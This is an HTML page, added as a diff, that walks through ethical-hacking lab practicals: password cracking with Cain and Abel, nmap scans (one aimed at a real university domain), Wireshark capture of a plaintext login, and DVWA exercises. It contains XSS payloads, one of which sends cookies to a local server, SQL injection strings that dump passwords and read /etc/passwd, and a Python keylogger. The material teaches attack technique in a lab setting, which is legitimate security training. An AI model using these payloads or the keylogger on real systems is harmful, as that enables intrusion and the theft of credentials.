@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Practical Steps of Ethical Hacking</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        h2 {
+            color: #333;
+        }
+
+        h3 {
+            color: #555;
+        }
+
+        ol {
+            list-style-type: decimal;
+            margin-left: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h2>Practical 1</h2>
+        <h3>Part 1: Whois</h3>
+        <p><strong>Steps:</strong></p>
+        <ol>
+            <li>Open the who.is website (<a href="https://who.is/" target="_blank">https://who.is/</a>). Then enter the
+                name of the website you want to search (in this case, google.com) and click on the search button.</li>
+            <li>Here, it shows you information about the website such as the DNS Records etc.</li>
+        </ol>
+        <h3>Part 2: Google Dorking</h3>
+        <p><strong>Theory:</strong></p>
+        <p>Google Dorking (Google Hacking) is a technique that utilizes advanced search operators to uncover information
+            on the internet that may not be readily available through standard search queries. This strategy takes
+            advantage of the features of Google’s search algorithms to locate specific text strings within search
+            results.</p>
+        <p><strong>Steps:</strong></p>
+        <ol>
+            <li>Go to <a href="https://tryhackme.com/" target="_blank">tryhackme.com</a>, register and search for
+                “Google Dorking”</li>
+            <li>Complete all the tasks and answer all the questions asked.</li>
+        </ol>
+        <p><strong>TASKS:</strong></p>
+        <ol>
+            <li>TASK 1:</li>
+            <li>TASK 2:</li>
+            <li>TASK 3:</li>
+            <li>TASK 4:</li>
+            <li>TASK 5:</li>
+        </ol>
+    </div>
+    <div class="container">
+        <h2>Practical 2</h2>
+
+        <h3>Part 1</h3>
+        <p><strong>Aim:</strong> Use Cryptool to encrypt and decrypt passwords using RC4 algorithm</p>
+        <p><strong>Theory:</strong> RC4 means Rivest Cipher 4 invented by Ron Rivest in 1987 for RSA Security. It is a
+            Stream Cipher and operates on a stream of data byte by byte. RC4 stream cipher is one of the most widely
+            used stream ciphers because of its simplicity and speed of operation. It is a variable key-size stream
+            cipher with byte-oriented operations.</p>
+        <p><strong>Steps:</strong></p>
+        <ol>
+            <li>Download the Cryptool from the site <a href="https://www.cryptool.org/en/"
+                    target="_blank">https://www.cryptool.org/en/</a></li>
+            <li>Click on the white sheet to open a new textbox. Write a sentence that you want to encrypt</li>
+            <li>Click on Encrypt/Decrypt -> Symmetric(modern) -> RC4. Then click on Encrypt.</li>
+            <li>Click on Encrypt/Decrypt -> Symmetric(modern) -> RC4. Now, click on “Decrypt”.</li>
+        </ol>
+
+        <h3>Part 2</h3>
+        <p><strong>Aim:</strong> Use Cain and Abel for cracking Windows account password using Dictionary attack and to
+            decode wireless network passwords</p>
+        <p><strong>Theory:</strong> A dictionary attack is a method of breaking into a password-protected computer,
+            network or other IT resource by systematically entering every word in a dictionary, or word list, as a
+            password. A dictionary attack can also be used in an attempt to find the key necessary to decrypt an
+            encrypted message or document. Dictionary attacks work because many computer users and businesses insist on
+            using ordinary words as passwords. Modern dictionary attacks use a wordlist as a base then try combinations
+            of words and permutations with common substitutions, such as replacing an "e" with a "3."</p>
+        <p><strong>Steps:</strong></p>
+        <ol>
+            <li>Open the Cain and Abel application</li>
+            <li>From the top toolbox, click on Tools and then open the “Hash Calculator”</li>
+            <li>Choose “Text to hash” and enter a password in the textbox below (in this case, it is password). Then
+                click on “Calculate”.</li>
+            <li>Then click on “Cracker” and open “MD5 Hashes”. Right click on screen and click on “Add to list”</li>
+            <li>Add the copied MD5 hash in the textbox and then click on OK</li>
+            <li>Right click on the added hash and then choose “Dictionary Attack”</li>
+            <li>Right click on the screen below “File” and then click on “Add to list”</li>
+            <li>Download a wordlist.txt from the Internet and then upload it. The wordlist has been added</li>
+            <li>Click on “Start”. The dictionary attack is performed and the plaintext of the MD5 hash has been found.
+            </li>
+        </ol>
+
+        <h3>Part 3</h3>
+        <p><strong>Aim:</strong> Brute Force Attack</p>
+        <p><strong>Theory:</strong> A brute force attack is a hacking method that uses trial and error to crack
+            passwords, login credentials, and encryption keys. A brute force attack uses trial-and-error to guess login
+            info, encryption keys, or find a hidden web page. Hackers work through all possible combinations hoping to
+            guess correctly. These attacks are done by ‘brute force’ meaning they use excessive forceful attempts to try
+            and ‘force’ their way into your private account(s).</p>
+        <p><strong>Steps:</strong></p>
+        <ol>
+            <li>Open the Cain and Abel application</li>
+            <li>From the top toolbox, click on Tools and then open the “Hash Calculator”</li>
+            <li>Choose “Text to hash” and enter a password in the textbox below (in this case, it is password). Then
+                click on “Calculate”.</li>
+            <li>Then click on “Cracker” and open “MD5 Hashes”. Right click on screen and click on “Add to list”</li>
+            <li>Add the copied MD5 hash in the textbox and then click on OK</li>
+            <li>Right click on the added hash and then choose “Brute Force Attack”</li>
+            <li>Make changes to the charset and length as you wish and then click on “Start”</li>
+            <li>The brute force attack is performed and the plaintext of the MD5 hash has been found.</li>
+        </ol>
+    </div>
+
+    <div class="container">
+        <h2>Practical 3: Run and Analyze Command Output in Windows</h2>
+        
+        <h3>Steps:</h3>
+        <ol>
+            <li>Open the Command Prompt on your computer and run the following commands:</li>
+            <li><strong>ipconfig</strong><br>ipconfig (standing for "Internet Protocol configuration") is a console application program of some computer operating systems that displays all current TCP/IP network configuration values and refreshes Dynamic Host Configuration Protocol (DHCP) and Domain Name System (DNS) settings.</li>
+            <li><strong>ping</strong><br>ping is the primary TCP/IP command used to troubleshoot connectivity, reachability, and name resolution. When used without parameters, this command displays Help content.</li>
+            <li><strong>tracert &lt;ip address&gt;</strong><br>Traceroute counts how many hops it takes packets to reach the host and how long each hop takes. It also calculates the exact path the packets traverse.</li>
+            <li><strong>netstat</strong><br>The netstat command generates displays that show network status and protocol statistics. You can display the status of TCP and UDP endpoints in table format, routing table information, and interface information.</li>
+            <li><strong>nslookup</strong><br>Nslookup (stands for “Name Server Lookup”) is a useful command for getting information from the DNS server. It is a network administration tool for querying the Domain Name System (DNS) to obtain domain name or IP address mapping or any other specific DNS record. It is also used to troubleshoot DNS-related problems.</li>
+        </ol>
+    </div>
+
+    <div class="container">
+        <div class="container">
+            <h2>Practical 4</h2>
+            <p><strong>Aim:</strong> Use NMAP scanner to perform port scanning of various forms - ACK, SYN, FIN, NULL,
+                XMAS</p>
+            <p><strong>Theory:</strong> A port scan is a network reconnaissance technique designed to identify which
+                ports are open on a computer.</p>
+            <h3>Commands:</h3>
+
+            <p><strong>i. SYN scan</strong></p>
+            <pre><code>Target: 172.23.0.128 (your IP address)
+    Command: nmap -sS 172.23.0.128</code></pre>
+
+            <p><strong>ii. FIN scan</strong></p>
+            <pre><code>Target: somaiya.edu
+    Command: nmap -sF somaiya.edu</code></pre>
+
+            <p><strong>iii. NULL scan</strong></p>
+            <pre><code>Target: [target address]
+    Command: nmap –sN [target address]</code></pre>
+
+            <p><strong>iv. XMAS scan</strong></p>
+            <pre><code>Target: [target address]
+    Command: nmap -sX [target address]</code></pre>
+
+            <p><strong>v. ACK Scan</strong></p>
+            <pre><code>Target: [ip address of another device]
+    Command: nmap -sA [ip address of another device]</code></pre>
+
+            <p><strong>Other scans:</strong></p>
+            <pre><code>nmap -T4 -A -v [ip address of another device]
+    nmap -p 21,80,443 [website name]</code></pre>
+        </div>
+        <h2>Practical 6</h2>
+        <p><strong>Aim:</strong> Use Wireshark (Sniffer) to capture network traffic and analyze it</p>
+        <p><strong>Theory:</strong> Wireshark is a network packet analyzer. A network packet analyzer presents captured
+            packet data in as much detail as possible. Wireshark does three things:</p>
+        <ol>
+            <li>Packet Capture: Wireshark listens to a network connection in real time and then grabs entire streams of
+                traffic – quite possibly tens of thousands of packets at a time.</li>
+            <li>Filtering: Wireshark is capable of slicing and dicing all of this random live data using filters. By
+                applying a filter, you can obtain just the information you need to see.</li>
+            <li>Visualization: Wireshark allows you to dive right into the very middle of a network packet. It also
+                allows you to visualize entire conversations and network streams.</li>
+        </ol>
+
+        <h3>Part 1: Using Wireshark to capture password</h3>
+        <p><strong>Steps:</strong></p>
+        <ol>
+            <li>Open the Wireshark application. Select the network interface that you want to sniff. Here it is “Wi-Fi”.
+                Then, click on the shark fin icon on the top left corner to start capturing packets. All the packets are
+                being captured.</li>
+            <li>Then open the web browser and go to <a href="http://www.techpanda.org/"
+                    target="_blank">http://www.techpanda.org/</a>. Here, enter the email address and the password (Here,
+                email is admin@google.com and password is Password@2010). Then click on the submit button. If you have
+                successfully logged in, the following dashboard will appear.</li>
+            <li>Then go back to Wireshark and stop the live capture of packets, which is done by clicking on the Stop
+                icon on the top left corner.</li>
+            <li>Then filter the results for HTTP protocol only by writing "http" in the filter textbox.</li>
+            <li>Then search for entries with the HTTP verb POST in the Info column and click on it.</li>
+            <li>Then below the log entries, there will be a panel with the summary of the captured data. Locate the one
+                that says “application/x-www-form-urlencoded”. Click on it and it shows the plaintext of the email and
+                password entered in techpanda.</li>
+        </ol>
+
+        <h3>Part 2: Using Wireshark to scan IP addresses, hosts etc.</h3>
+        <p><strong>Steps:</strong></p>
+        <ol>
+            <li>Open the Wireshark application. Select the network interface that you want to sniff. Here it is “Wi-Fi”.
+                Then, click on the shark fin icon on the top left corner to start capturing packets. All the packets are
+                being captured.</li>
+            <li>Filter the results for “http”.</li>
+            <li>Filter the results for tcp port 80.</li>
+            <li>Filter the results for tcp port 80 or udp port 80.(Also search this ip.addr == 192.168.1.113)</li>
+        </ol>
+    </div>
+    <div class="container">
+        <h2>Practical 7: Simulate Persistent Cross-Site Scripting (XSS) Attack</h2>
+        <p><strong>Aim:</strong> Simulate persistent cross-site scripting attack</p>
+        <p><strong>Theory:</strong> Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other.</p>
+        
+        <h3>Part 1: XSS (Reflected)</h3>
+        <p><strong>Steps:</strong></p>
+        <ol>
+            <li>Download and setup XAMPP. Then start Apache.</li>
+            <li>Click on the “Config” -> “my.ini” in MySQL. Change all the port numbers from 3306 to 3307 and save the file.</li>
+            <li>Go back to the XAMPP server and start the MySQL server.</li>
+            <li>Download the DVWA folder from the github link (<a href="https://github.com/digininja/DVWA" target="_blank">https://github.com/digininja/DVWA</a>).</li>
+            <li>Unzip the downloaded zipped folder and then extract the contents to the htdocs folder of XAMPP.</li>
+            <li>Then navigate to the DVWA folder in the htdocs and open the “config” folder. In the config folder, change the name of the “config.inc.php.dist” file to “config.inc.php” by removing the .dist extension.</li>
+            <li>Then open the file and edit the highlighted data variables as follows: Remove the getenv(‘DB_SERVER’) ?: in db_server, Change the password to “password” in db_password, Change the port number to “3307” in db_port. Then save the file after making the changes.</li>
+            <li>Go back to the XAMPP folder and then navigate to the “phpMyAdmin” folder. Then, open the config.inc file present. Add the following underneath the information section: $cfg[‘Servers’][$i][‘port’] = 3307;. Then save the file.</li>
+            <li>Go to XAMPP and click on “Admin” in MySQL. Create a database named “dvwa”.</li>
+            <li>Then go to “User Accounts”. Then, add the following to the URL “&adduser=1&dbname=dvwa” to get privileges for the database. Enter the details: username as dvwa and password as password. Check the grant all privileges on database dvwa checkbox. Then click on Go.</li>
+            <li>Then open a new browser window and search for “localhost/dvwa”. Login with “dvwa” and “password” as the username and password respectively. If there is a 404 Error then change the DVWA-master folder’s name to DVWA and refresh the page.</li>
+            <li>Go to the XAMPP server and click on “Config” in Apache. Then open the “php.ini” file. Search for allow_url_include and allow_url_fopen and change both of them to On. Search for gd and remove the semicolon(;) from that line.</li>
+            <li>Now go back to the browser page. Click on “Create / Reset Database” and the database will be created. Then click on “login”.</li>
+            <li>Now, enter “admin” and “password” as the username and password respectively. The settings are enabled.</li>
+            <li>Navigate to the “DVWA Security” tab and change the security level from impossible to low.</li>
+            <li>Now, go to the “XSS (Reflected)” tab and enter your name. The output will be “Hello &lt;Name&gt;”.</li>
+            <li>Then enter the following script : &lt;script&gt;alert('XSS')&lt;/script&gt; in place of the name. Then click on “Submit”. The output is as follows:</li>
+        </ol>
+
+        <h3>Part 2: XSS (Stored)</h3>
+        <p><strong>Steps:</strong></p>
+        <ol>
+            <li>Follow the steps above.</li>
+            <li>Go to the “XSS (Stored)” tab. Enter the name as “crypto” and the message as “hi”. Then click on “Sign Guestbook”. The output is as follows.</li>
+            <li>Then enter the name as “crypto” and enter the script : &lt;script&gt;alert("You have been hacked")&lt;/script&gt;. Then click on “Sign Guestbook”. The output is as follows.</li>
+            <li>Go to the Command Prompt on your laptop and type the following command : python -m http.server 1337. Right-click on the message box and then click on “Inspect”. Change the maxlength to “200”. Enter the following script in the message box : &lt;script&gt;window.location=’http://localhost:1337/?cookie' + document.cookie&lt;/script&gt;.</li>
+        </ol>
+    </div>
+
+    <div class="container">
+        <h2>Practical 8: Perform SQL Injection Attack</h2>
+        <p><strong>Aim:</strong> Perform SQL Injection attack</p>
+        <p><strong>Theory:</strong> SQL Injection (SQLi) is a type of an injection attack that makes it possible to execute malicious SQL statements. These statements control a database server behind a web application. Attackers can use SQL Injection vulnerabilities to bypass application security measures.</p>
+        
+        <h3>Steps:</h3>
+        <ol>
+            <li>Follow the steps as in Practical 7 to setup the XAMPP, Apache and MySQL servers.</li>
+            <li>Go to the “SQL Injection” tab. Enter the User ID from 1 to 5. The output is as follows :</li>
+            <li>Enter the following query : a' OR ''='</li>
+            <li>Enter the following query : ' union select 1,@@version#</li>
+            <li>Enter the following query : ' union select null,@@version#</li>
+            <li>Enter the following query : ' union select null,@@hostname #</li>
+            <li>Enter the following query : ' union select null,database() #</li>
+            <li>Enter the following query : ' union select null,schema_name from information_schema.schemata #</li>
+            <li>Enter the following query : ' union select null,concat(first_name,0x0a,password) from users #</li>
+            <li>Enter the following query : ' union select null,@@datadir #</li>
+            <li>Enter the following query : ' union all select load_file('/etc/passwd'),null #</li>
+        </ol>
+    </div>
+
+    <div class="container">
+        <h2>Practical 9</h2>
+        <p><strong>Aim:</strong> Create a simple keylogger using Python</p>
+        <p><strong>Theory:</strong> A keylogger or keystroke logger/keyboard capturing is a form of malware or hardware
+            that keeps track of and records your keystrokes as you type. It takes the information and sends it to a
+            hacker using a command-and-control (C&C) server.</p>
+        <p><strong>Steps:</strong></p>
+        <ol>
+            <li>Install the pynput library using the command <code>pip install pynput</code></li>
+            <li>Open the Python IDLE and enter the following code :</li>
+        </ol>
+        <pre><code>import pynput
+from pynput.keyboard import Key, Listener
+
+keys = []
+
+def on_press(key):
+    keys.append(key)
+    write_file(keys)
+    try:
+        print('alphanumeric key {0} pressed'.format(key.char))
+    except AttributeError:
+        print('special key {0} pressed'.format(key))
+
+def write_file(keys):
+    with open('log.txt', 'w') as f:
+        for key in keys:
+            # removing ''
+            k = str(key).replace("'", "")
+            f.write(k)
+            # explicitly adding a space after
+            # every keystroke for readability
+            f.write(' ')
+
+def on_release(key):
+    print('{0} released'.format(key))
+    if key == Key.esc:
+        # Stop listener
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()</code></pre>
+    </div>
+</body>
+
+</html>
